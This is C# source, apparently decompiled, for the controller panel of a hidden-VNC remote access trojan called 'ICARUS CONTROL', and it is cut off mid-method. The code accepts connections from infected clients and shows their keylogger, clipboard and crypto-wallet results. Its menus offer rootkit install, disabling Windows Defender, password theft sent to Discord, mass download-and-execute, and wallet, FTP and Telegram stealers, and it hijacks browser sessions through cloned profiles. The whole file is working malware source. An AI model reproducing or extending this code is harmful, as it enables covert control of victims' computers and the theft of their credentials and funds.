using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ShitarusPrivate.HVNC.Properties;

namespace ShitarusPrivate.HVNC
{
    public class Manager : Form
    {
        private class BlueRenderer : ToolStripProfessionalRenderer
        {
            protected override void OnRenderMenuItemBackground(ToolStripItemRenderEventArgs e)
            {
                Rectangle rect = new Rectangle(Point.Empty, e.Item.Size);
                Color color = (e.Item.Selected ? Color.White : Color.White);
                using (SolidBrush brush = new SolidBrush(color))
                {
                    e.Graphics.FillRectangle(brush, rect);
                }
                if (!e.Item.Selected)
                {
                    e.Item.ForeColor = Color.Black;
                    base.OnRenderMenuItemBackground(e);
                    return;
                }
                Pen pen = new Pen(Color.SteelBlue);
                SolidBrush solidBrush = new SolidBrush(Color.SteelBlue);
                e.Item.ForeColor = Color.Black;
                Rectangle rect2 = new Rectangle(Point.Empty, e.Item.Size);
                e.Graphics.FillRectangle(solidBrush, rect2);
                e.Graphics.DrawRectangle(pen, 0, 0, rect2.Width, rect2.Height);
                pen.Dispose();
                solidBrush.Dispose();
            }
        }

        [Serializable]
        [CompilerGenerated]
        private sealed class __c
        {
            public static readonly __c __9 = new __c();

            public static Func<string, char> __9__19_0;

            public static MethodInvoker __9__30_0;

            public static Func<string, char> __9__33_0;

            public static DrawListViewColumnHeaderEventHandler __9__41_1;

            public static DrawListViewItemEventHandler __9__41_2;

            public static DrawListViewSubItemEventHandler __9__41_3;

            internal char _RandomNumber_b__19_0(string s)
            {
                return s[random.Next(s.Length)];
            }

            internal void _GetStatus_b__30_0()
            {
            }

            internal char _RandomMutex_b__33_0(string s)
            {
                return s[random.Next(s.Length)];
            }

            internal void _FrmMain_Load_b__41_1(object sender, DrawListViewColumnHeaderEventArgs e)
            {
                Brush brush = new SolidBrush(Color.White);
                e.Graphics.FillRectangle(brush, e.Bounds);
                TextRenderer.DrawText(e.Graphics, e.Header.Text, e.Font, e.Bounds, Color.Black);
            }

            internal void _FrmMain_Load_b__41_2(object sender, DrawListViewItemEventArgs e)
            {
                e.DrawDefault = true;
            }

            internal void _FrmMain_Load_b__41_3(object sender, DrawListViewSubItemEventArgs e)
            {
                e.DrawDefault = true;
            }
        }

        [CompilerGenerated]
        private sealed class __c__DisplayClass21_0
        {
            public Manager __4__this;

            public TcpClient tcpClient;

            public ListViewItem lvi;

            internal void _ReadResult_b__0()
            {
                checked
                {
                    lock (_clientList)
                    {
                        __4__this.ClientsList.Items.Add(lvi);
                        __4__this.ClientsList.Items[int_2].Selected = true;
                        _clientList.Add(tcpClient);
                        int_2++;
                        __4__this.Text = " ICARUS CONTROL " + versioning() + "  - Connections: " + Conversions.ToString(int_2);
                    }
                }
            }
        }

        [CompilerGenerated]
        private sealed class __c__DisplayClass21_1
        {
            public int NumberReceived;

            internal void _ReadResult_b__1()
            {
                if (Application.OpenForms[NumberReceived].IsHandleCreated)
                {
                    Application.OpenForms[NumberReceived].Close();
                }
            }
        }

        private ListViewItem lvHoveredItem;

        public static List<TcpClient> _clientList;

        public static TcpListener _TcpListener;

        private Thread VNC_Thread;

        public static int SelectClient;

        private int int_0;

        private bool bool_1;

        private bool bool_2;

        public MoveBytes MoveBytes0;

        public TGtoDSC TGDC0;

        public IWhoamiN TGDCF;

        public static int int_2;

        public static Random random = new Random();

        public int count;

        public TGtoDSC ST_0;

        public RD RDF;

        private string userName = Environment.UserName;

        private string selectedClient;

        private List<TcpClient> clients = new List<TcpClient>();

        private string imgBytes;

        public static string url;

        public static string domain;

        public static string user;

        public static string pass;

        public static string tgchatid;

        public static string tgtoken;

        public static string webhook;

        public static bool ispressed = false;

        private IContainer components;

        private ColumnHeader columnHeader1;

        private ColumnHeader columnHeader2;

        private ContextMenuStrip contextMenuStrip1;

        private ToolStripMenuItem buildHVNCToolStripMenuItem;

        private ColumnHeader columnHeader3;

        private ColumnHeader columnHeader4;

        private ColumnHeader columnHeader5;

        private ColumnHeader columnHeader6;

        private ColumnHeader columnHeader7;

        private ImageList imageList1;

        private ImageList imageList2;

        private ListView ClientsList;

        private PrimeTheme primeTheme1;

        private StudioButton studioButton5;

        private StudioButton studioButton4;

        private StudioButton studioButton3;

        private StudioButton studioButton1;

        private Label HVNCListen;

        private Label label1;

        private PictureBox pictureBox1;

        private Label label3;

        private Panel panel1;

        private ToolStripMenuItem controlManagementToolStripMenuItem;

        private ToolStripMenuItem miscOptionsToolStripMenuItem;

        private ToolStripMenuItem serverControlToolStripMenuItem;

        private ToolStripMenuItem hVNCPanelToolStripMenuItem;

        private ToolStripMenuItem startupToolStripMenuItem;

        private ToolStripMenuItem taskToolStripMenuItem;

        private ToolStripMenuItem watcherToolStripMenuItem;

        private ToolStripMenuItem rootkitToolStripMenuItem;

        private ToolStripMenuItem uninstallToolStripMenuItem;

        private ToolStripMenuItem restartToolStripMenuItem;

        private ToolStripMenuItem resetSizeToolStripMenuItem;

        private ToolStripMenuItem killWindowsDefenderToolStripMenuItem;

        private JCS.ToggleSwitch chkListen;

        private ToolStripMenuItem passwordsRecoveryToolStripMenuItem;

        private ToolTip toolTip1;

        private ToolStripMenuItem stealAndSendToDiscordToolStripMenuItem;

        private System.Windows.Forms.Timer timer1;

        private ToolStripMenuItem updateBotsToolStripMenuItem;

        private ToolStripMenuItem downloadExecutewithArgsToolStripMenuItem;

        private Label txtSub;

        private Label label4;

        private Label Expiry;

        private Label label2;

        private ToolStripMenuItem remoteDesktopToolStripMenuItem;

        private System.Windows.Forms.Timer timer2;

        private ToolStripMenuItem massWalletStealerToolStripMenuItem;

        private ToolStripMenuItem massDownloadExecuteToolStripMenuItem;

        private ToolStripMenuItem icarussThiefToolStripMenuItem;

        private ToolStripMenuItem massExecuteStealerToolStripMenuItem;

        private ToolStripMenuItem massExcuteFTPStealerToolStripMenuItem;

        private ToolStripMenuItem massExecuteDiscordStealerToolStripMenuItem;

        private ToolStripMenuItem massExecuteTelegramStealerToolStripMenuItem;

        private ToolStripMenuItem massExecuteWalletStealerToolStripMenuItem;

        public string xxhostname { get; set; }

        public string xxip { get; set; }

        public static string Results { get; internal set; }

        public static string saveurl { get; set; }

        public static string MassURL { get; set; }

        private void HVNCList_SelectedIndexChanged(object sender, EventArgs e)
        {
        }

        private void HVNCList_MouseLeave(object sender, EventArgs e)
        {
            if (lvHoveredItem != null && lvHoveredItem != ClientsList.Tag)
            {
                lvHoveredItem.BackColor = Color.FromArgb(54, 74, 104);
            }
            lvHoveredItem = null;
        }

        private void HVNCList_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right || ClientsList.SelectedIndices.Count != 0)
            {
                return;
            }
            foreach (ListViewItem item in ClientsList.Items)
            {
                item.ForeColor = Color.Black;
                item.BackColor = Color.FromArgb(54, 74, 104);
            }
            ClientsList.Tag = null;
        }

        public Manager()
        {
            int_0 = 0;
            bool_1 = true;
            bool_2 = false;
            MoveBytes0 = new MoveBytes();
            InitializeComponent();
        }

        private void Listenning()
        {
            checked
            {
                try
                {
                    _clientList = new List<TcpClient>();
                    _TcpListener = new TcpListener(IPAddress.Any, Convert.ToInt32(Settings.Default.PORT));
                    _TcpListener.Start();
                    _TcpListener.BeginAcceptTcpClient(ResultAsync, _TcpListener);
                }
                catch (Exception ex)
                {
                    try
                    {
                        if (ex.Message.Contains("aborted"))
                        {
                            return;
                        }
                        IEnumerator enumerator = null;
                        while (true)
                        {
                            try
                            {
                                try
                                {
                                    enumerator = Application.OpenForms.GetEnumerator();
                                    while (enumerator.MoveNext())
                                    {
                                        Form form = (Form)enumerator.Current;
                                        if (form.Name.Contains("FrmVNC"))
                                        {
                                            form.Dispose();
                                        }
                                    }
                                }
                                finally
                                {
                                    if (enumerator is IDisposable)
                                    {
                                        (enumerator as IDisposable).Dispose();
                                    }
                                }
                            }
                            catch (Exception)
                            {
                                continue;
                            }
                            break;
                        }
                        bool_1 = false;
                        int num = _clientList.Count - 1;
                        for (int i = 0; i <= num; i++)
                        {
                            _clientList[i].Close();
                        }
                        _clientList = new List<TcpClient>();
                        int_2 = 0;
                        _TcpListener.Stop();
                        Text = " ICARUS CONTROL " + versioning() + "  - Connections: 0";
                    }
                    catch (Exception)
                    {
                    }
                }
            }
        }

        public static string versioning()
        {
            Assembly executingAssembly = Assembly.GetExecutingAssembly();
            FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(executingAssembly.Location);
            return versionInfo.ProductVersion;
        }

        public static string RandomNumber(int length)
        {
            return new string(Enumerable.Repeat("01234567890", length).Select(__c.__9__19_0 ?? (__c.__9__19_0 = __c.__9._RandomNumber_b__19_0)).ToArray());
        }

        public void ResultAsync(IAsyncResult iasyncResult_0)
        {
            try
            {
                TcpClient tcpClient = ((TcpListener)iasyncResult_0.AsyncState).EndAcceptTcpClient(iasyncResult_0);
                tcpClient.GetStream().BeginRead(new byte[1], 0, 0, ReadResult, tcpClient);
                _TcpListener.BeginAcceptTcpClient(ResultAsync, _TcpListener);
            }
            catch (Exception)
            {
            }
        }

        public void ReadResult(IAsyncResult iasyncResult_0)
        {
            __c__DisplayClass21_0 _c__DisplayClass21_ = new __c__DisplayClass21_0();
            _c__DisplayClass21_.__4__this = this;
            _c__DisplayClass21_.tcpClient = (TcpClient)iasyncResult_0.AsyncState;
            checked
            {
                try
                {
                    BinaryFormatter binaryFormatter = new BinaryFormatter();
                    binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
                    binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
                    binaryFormatter.FilterLevel = TypeFilterLevel.Full;
                    byte[] array = new byte[8];
                    int num = 8;
                    int num2 = 0;
                    while (num > 0)
                    {
                        int num3 = _c__DisplayClass21_.tcpClient.GetStream().Read(array, num2, num);
                        num -= num3;
                        num2 += num3;
                    }
                    ulong num4 = BitConverter.ToUInt64(array, 0);
                    int num5 = 0;
                    byte[] array2 = new byte[Convert.ToInt32(decimal.Subtract(new decimal(num4), 1m)) + 1];
                    using (MemoryStream memoryStream = new MemoryStream())
                    {
                        int num6 = 0;
                        int num7 = array2.Length;
                        while (num7 > 0)
                        {
                            num5 = _c__DisplayClass21_.tcpClient.GetStream().Read(array2, num6, num7);
                            num7 -= num5;
                            num6 += num5;
                        }
                        memoryStream.Write(array2, 0, (int)num4);
                        memoryStream.Position = 0L;
                        object objectValue = RuntimeHelpers.GetObjectValue(binaryFormatter.Deserialize(memoryStream));
                        if (objectValue is string)
                        {
                            string[] array3 = (string[])NewLateBinding.LateGet(objectValue, null, "split", new object[1] { "|" }, null, null, null);
                            try
                            {
                                if (Operators.CompareString(array3[0], "54321", TextCompare: false) == 0)
                                {
                                    string text;
                                    try
                                    {
                                        text = ((IPEndPoint)_c__DisplayClass21_.tcpClient.Client.RemoteEndPoint).Address.ToString();
                                    }
                                    catch
                                    {
                                        text = ((IPEndPoint)_c__DisplayClass21_.tcpClient.Client.RemoteEndPoint).Address.ToString();
                                    }
                                    _c__DisplayClass21_.lvi = new ListViewItem(new string[7]
                                    {
                                        " " + array3[1].Replace(" ", null) + RandomNumber(5),
                                        text,
                                        array3[2],
                                        array3[3],
                                        array3[4],
                                        array3[5],
                                        array3[6]
                                    })
                                    {
                                        Tag = _c__DisplayClass21_.tcpClient,
                                        ImageKey = array3[3].ToString() + ".png"
                                    };
                                    ClientsList.Invoke(new MethodInvoker(_c__DisplayClass21_._ReadResult_b__0));
                                }
                                else if (_clientList.Contains(_c__DisplayClass21_.tcpClient))
                                {
                                    GetStatus(RuntimeHelpers.GetObjectValue(objectValue), _c__DisplayClass21_.tcpClient);
                                }
                                else
                                {
                                    _c__DisplayClass21_.tcpClient.Close();
                                }
                            }
                            catch (Exception)
                            {
                            }
                        }
                        else if (_clientList.Contains(_c__DisplayClass21_.tcpClient))
                        {
                            GetStatus(RuntimeHelpers.GetObjectValue(objectValue), _c__DisplayClass21_.tcpClient);
                        }
                        else
                        {
                            _c__DisplayClass21_.tcpClient.Close();
                        }
                        memoryStream.Close();
                        memoryStream.Dispose();
                    }
                    _c__DisplayClass21_.tcpClient.GetStream().BeginRead(new byte[1], 0, 0, ReadResult, _c__DisplayClass21_.tcpClient);
                }
                catch (Exception ex2)
                {
                    if (!ex2.Message.Contains("disposed"))
                    {
                        try
                        {
                            if (_clientList.Contains(_c__DisplayClass21_.tcpClient))
                            {
                                __c__DisplayClass21_1 _c__DisplayClass21_2 = new __c__DisplayClass21_1();
                                _c__DisplayClass21_2.NumberReceived = Application.OpenForms.Count - 2;
                                while (_c__DisplayClass21_2.NumberReceived >= 0)
                                {
                                    if (Application.OpenForms[_c__DisplayClass21_2.NumberReceived] != null && Application.OpenForms[_c__DisplayClass21_2.NumberReceived].Tag == _c__DisplayClass21_.tcpClient)
                                    {
                                        if (Application.OpenForms[_c__DisplayClass21_2.NumberReceived].Visible)
                                        {
                                            Invoke(new MethodInvoker(_c__DisplayClass21_2._ReadResult_b__1));
                                        }
                                        else if (Application.OpenForms[_c__DisplayClass21_2.NumberReceived].IsHandleCreated)
                                        {
                                            Application.OpenForms[_c__DisplayClass21_2.NumberReceived].Close();
                                        }
                                    }
                                    _c__DisplayClass21_2.NumberReceived += -1;
                                }
                                lock (_clientList)
                                {
                                    try
                                    {
                                        int index = _clientList.IndexOf(_c__DisplayClass21_.tcpClient);
                                        _clientList.RemoveAt(index);
                                        ClientsList.Items.RemoveAt(index);
                                        _c__DisplayClass21_.tcpClient.Close();
                                        int_2--;
                                        Text = " ICARUS CONTROL " + versioning() + "  - Connections: " + Conversions.ToString(int_2);
                                        return;
                                    }
                                    catch (Exception)
                                    {
                                        return;
                                    }
                                }
                            }
                            return;
                        }
                        catch (Exception)
                        {
                            return;
                        }
                    }
                    _c__DisplayClass21_.tcpClient.Close();
                }
            }
        }

        public void GetStatus(object object_2, TcpClient tcpClient_0)
        {
            int hashCode = tcpClient_0.GetHashCode();
            hVNC hVNC2 = (hVNC)Application.OpenForms["VNCForm:" + Conversions.ToString(hashCode)];
            if (!(object_2 is Bitmap))
            {
                if (!(object_2 is string))
                {
                    return;
                }
                string[] array = Conversions.ToString(object_2).Split('|');
                string left = array[0];
                if (Operators.CompareString(left, "0", TextCompare: false) == 0)
                {
                    hVNC2.VNCBoxe.Tag = new Size(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]));
                    hVNC2.Sz = new Size(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]));
                }
                if (Operators.CompareString(left, "9", TextCompare: false) != 0)
                {
                    Invoke(__c.__9__30_0 ?? (__c.__9__30_0 = __c.__9._GetStatus_b__30_0));
                }
                if (Operators.CompareString(left, "991", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "360 Browser successfully started with clone profile !";
                }
                if (Operators.CompareString(left, "881", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "360 Browser started successfully !";
                }
                if (Operators.CompareString(left, "992", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "Atom Browser successfully started with clone profile !";
                }
                if (Operators.CompareString(left, "882", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "Atom Browser started successfully !";
                }
                if (Operators.CompareString(left, "993", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "Awast Browser successfully started with clone profile !";
                }
                if (Operators.CompareString(left, "883", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "Awast Browser started successfully !";
                }
                if (Operators.CompareString(left, "994", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "Chromodo Browser successfully started with clone profile !";
                }
                if (Operators.CompareString(left, "884", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "Chromodo Browser started successfully !";
                }
                if (Operators.CompareString(left, "995", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "CocCoc Browser successfully started with clone profile !";
                }
                if (Operators.CompareString(left, "885", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "CocCoc Browser started successfully !";
                }
                if (Operators.CompareString(left, "996", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "Comodo Dragon Browser successfully started with clone profile !";
                }
                if (Operators.CompareString(left, "886", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "Comodo Dragon Browser started successfully!";
                }
                if (Operators.CompareString(left, "997", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "Epic Browser successfully started with clone profile !";
                }
                if (Operators.CompareString(left, "887", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "Epic Browser started successfully !";
                }
                if (Operators.CompareString(left, "998", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "Opera Neon Browser successfully started with clone profile !";
                }
                if (Operators.CompareString(left, "888", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "Opera Neon Browser started successfully!";
                }
                if (Operators.CompareString(left, "999", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "Orbitum Browser successfully started with clone profile !";
                }
                if (Operators.CompareString(left, "889", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "Orbitum Browser started successfully!";
                }
                if (Operators.CompareString(left, "1000", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "Palemoon Browser successfully started with clone profile !";
                }
                if (Operators.CompareString(left, "2000", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "Palemoon Browser started successfully!";
                }
                if (Operators.CompareString(left, "1001", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "Slimjet Browser successfully started with clone profile !";
                }
                if (Operators.CompareString(left, "2001", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "Slimjet Browser started successfully!";
                }
                if (Operators.CompareString(left, "1002", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "Sputnik Browser successfully started with clone profile !";
                }
                if (Operators.CompareString(left, "2002", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "Sputnik Browser started successfully!";
                }
                if (Operators.CompareString(left, "1003", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "UC Browser successfully started with clone profile !";
                }
                if (Operators.CompareString(left, "2003", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "UC Browser started successfully!";
                }
                if (Operators.CompareString(left, "1004", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "Vivaldi Browser successfully started with clone profile !";
                }
                if (Operators.CompareString(left, "2004", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "Vivaldi Browser started successfully!";
                }
                if (Operators.CompareString(left, "1005", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "WaterFox Browser successfully started with clone profile !";
                }
                if (Operators.CompareString(left, "2005", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "WaterFox Browser started successfully!";
                }
                if (Operators.CompareString(left, "1006", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "Yandex Browser successfully started with clone profile !";
                }
                if (Operators.CompareString(left, "2006", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "Yandex Browser started successfully!";
                }
                if (Operators.CompareString(left, "200", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "Chrome successfully started with clone profile !";
                }
                if (Operators.CompareString(left, "201", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "Chrome successfully started !";
                }
                if (Operators.CompareString(left, "202", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "Firefox successfully started with clone profile !";
                }
                if (Operators.CompareString(left, "203", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "Firefox successfully started !";
                }
                if (Operators.CompareString(left, "204", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "Edge successfully started with clone profile !";
                }
                if (Operators.CompareString(left, "205", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "Edge successfully started !";
                }
                if (Operators.CompareString(left, "206", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "Brave successfully started with clone profile !";
                }
                if (Operators.CompareString(left, "207", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "Brave successfully started !";
                }
                if (Operators.CompareString(left, "256", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "Downloaded successfully ! | Executed...";
                }
                if (Operators.CompareString(left, "222", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "Successfully started !";
                }
                if (Operators.CompareString(left, "223", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "Successfully started !";
                }
                if (Operators.CompareString(left, "22", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.int_0 = Conversions.ToInteger(array[1]);
                    hVNC2.FrmTransfer0.DuplicateProgesse.Value = Conversions.ToInteger(array[1]);
                }
                if (Operators.CompareString(left, "23", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.DuplicateProfile(Conversions.ToInteger(array[1]));
                }
                if (Operators.CompareString(left, "24", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "Clone successfully !";
                }
                if (Operators.CompareString(left, "25", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = array[1];
                }
                if (Operators.CompareString(left, "26", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = array[1];
                }
                if (Operators.CompareString(left, "2555", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = array[1];
                }
                if (Operators.CompareString(left, "2556", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = array[1];
                }
                if (Operators.CompareString(left, "2557", TextCompare: false) == 0)
                {
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = array[1];
                }
                if (Operators.CompareString(left, "2167", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    hVNC2.txtScreen.Text = array[1].ToString();
                }
                if (Operators.CompareString(left, "2168", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    hVNC2.txtFPS.Text = array[1].ToString();
                }
                if (Operators.CompareString(left, "3607", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    hVNC2.txtKeyl.Text = array[1].ToString();
                }
                if (Operators.CompareString(left, "3608", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    hVNC2.txtClip.Text = array[1].ToString();
                }
                if (Operators.CompareString(left, "8001", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtzcash.ForeColor = Color.LimeGreen;
                        hVNC2.txtzcash.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtzcash.ForeColor = Color.DarkRed;
                        hVNC2.txtzcash.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8002", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtArmory.ForeColor = Color.LimeGreen;
                        hVNC2.txtArmory.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtArmory.ForeColor = Color.DarkRed;
                        hVNC2.txtArmory.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8003", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtBytecoin.ForeColor = Color.LimeGreen;
                        hVNC2.txtBytecoin.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtBytecoin.ForeColor = Color.DarkRed;
                        hVNC2.txtBytecoin.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8004", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtJaxx.ForeColor = Color.LimeGreen;
                        hVNC2.txtJaxx.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtJaxx.ForeColor = Color.DarkRed;
                        hVNC2.txtJaxx.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8005", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtExodus.ForeColor = Color.LimeGreen;
                        hVNC2.txtExodus.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtExodus.ForeColor = Color.DarkRed;
                        hVNC2.txtExodus.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8006", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtGuarda.ForeColor = Color.LimeGreen;
                        hVNC2.txtGuarda.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtGuarda.ForeColor = Color.DarkRed;
                        hVNC2.txtGuarda.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8007", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtCoinomi.ForeColor = Color.LimeGreen;
                        hVNC2.txtCoinomi.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtCoinomi.ForeColor = Color.DarkRed;
                        hVNC2.txtCoinomi.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8008", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtLiquality.ForeColor = Color.LimeGreen;
                        hVNC2.txtLiquality.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtLiquality.ForeColor = Color.DarkRed;
                        hVNC2.txtLiquality.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8009", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtNifty.ForeColor = Color.LimeGreen;
                        hVNC2.txtNifty.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtNifty.ForeColor = Color.DarkRed;
                        hVNC2.txtNifty.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8010", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtOxygen.ForeColor = Color.LimeGreen;
                        hVNC2.txtOxygen.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtOxygen.ForeColor = Color.DarkRed;
                        hVNC2.txtOxygen.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8011", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtCrocobit.ForeColor = Color.LimeGreen;
                        hVNC2.txtCrocobit.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtCrocobit.ForeColor = Color.DarkRed;
                        hVNC2.txtCrocobit.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8012", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtKeplr.ForeColor = Color.LimeGreen;
                        hVNC2.txtKeplr.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtKeplr.ForeColor = Color.DarkRed;
                        hVNC2.txtKeplr.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8013", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtFinnie.ForeColor = Color.LimeGreen;
                        hVNC2.txtFinnie.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtFinnie.ForeColor = Color.DarkRed;
                        hVNC2.txtFinnie.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8014", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtSwash.ForeColor = Color.LimeGreen;
                        hVNC2.txtSwash.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtSwash.ForeColor = Color.DarkRed;
                        hVNC2.txtSwash.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8015", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtStarcoin.ForeColor = Color.LimeGreen;
                        hVNC2.txtStarcoin.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtStarcoin.ForeColor = Color.DarkRed;
